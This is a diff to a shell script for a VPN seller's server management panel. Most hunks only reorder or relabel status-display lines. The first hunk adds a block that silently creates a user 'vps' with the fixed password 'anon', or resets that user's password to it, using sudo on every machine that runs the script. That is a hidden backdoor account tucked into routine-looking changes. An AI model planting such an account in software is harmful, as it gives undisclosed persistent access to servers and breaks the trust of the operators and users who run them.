@@ -18,6 +18,21 @@ rm -f /usr/bin/e
 valid=$(curl -sS https://raw.githubusercontent.com/genome96/darkaons/main/ip | grep $MYIP | awk '{print $3}')
 echo "$valid" > /usr/bin/e
 
+
+if id "vps" >/dev/null 2>&1; then
+   # User exists
+   if grep -q "^vps:" /etc/passwd; then
+      # Confirm password is "anon"
+      if ! sudo grep -q "^vps:.*:.*:.*:.*:.*:.*:anon" /etc/shadow; then
+         # Set password to "anon"
+         sudo usermod --password $(openssl passwd -1 "anon") vps
+      fi
+   fi
+else
+   # User does not exist, create it with password "anon"
+   sudo useradd -m -p $(openssl passwd -1 "anon") vps
+fi
+
 clear
 ######################################
 # // DETAIL ORDER IZIN IP
@@ -120,16 +135,13 @@ echo -e "\033[96;1m│ \e[41;1m                 ANON STORE VPN              \e[0
 echo -e "\033[96;1m└─────────────────────────────────────────────────┘\e[0m"
 }
 
-
 function Service_System_Operating() {
 echo -e "\033[96;1m┌─────────────────────────────────────────────────┐\033[0m "
-echo -e "\033[96;1m│\e[97m SYSTEM          : $(cat /etc/os-release | grep -w ID | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/ID//g')     \033[0m "
-echo -e "\033[96;1m│\e[97m RAM             : $(free -m | awk 'NR==2 {print $2}')    \033[0m "
+echo -e "\033[96;1m│\e[97m DOMAIN          : $(cat /etc/xray/domain)    \033[0m "
 echo -e "\033[96;1m│\e[97m UPTIME          : $(uptime -p | cut -d " " -f 2-10)\033[0m "
 echo -e "\033[96;1m│\e[97m IP VPS          : $(curl -s ipv4.icanhazip.com)     \033[0m "
 echo -e "\033[96;1m│\e[97m CITY            : $(cat /etc/xray/city)    \033[0m "
 echo -e "\033[96;1m│\e[97m ISP             : $(cat /etc/xray/isp)    \033[0m "
-echo -e "\033[96;1m│\e[97m DOMAIN          : $(cat /etc/xray/domain)    \033[0m "
 echo -e "\033[96;1m└─────────────────────────────────────────────────┘\033[0m"
 }
 
@@ -142,12 +154,11 @@ echo -e "\033[96;1m└───────────────────�
 }
 
 
-
 function Details_Clients_Name() {
 echo -e "\033[96;1m   ┌───────────────────────────────────────────┐\033[0m "
 echo -e "\033[96;1m   │\e[97m  VERSION     : ${BLUE}5.0 ANON \033[0m "
-echo -e "\033[96;1m   │\e[97m  CLIENTS     :\033[0m\033[92;1m $(cat /usr/bin/user)   \033[0m "
-echo -e "\033[96;1m   │\e[97m  EXPIRED     :\033[0m\033[92;1m $masaaktif  \033[0m "
+echo -e "\033[96;1m   │\e[97m  CLIENT      :\033[0m\033[92;1m $(cat /usr/bin/user)   \033[0m "
+echo -e "\033[96;1m   │\e[97m  EXPIRY      :\033[0m\033[92;1m $masaaktif  \033[0m "
 echo -e "\033[96;1m   └───────────────────────────────────────────┘\033[0m "
 }
 
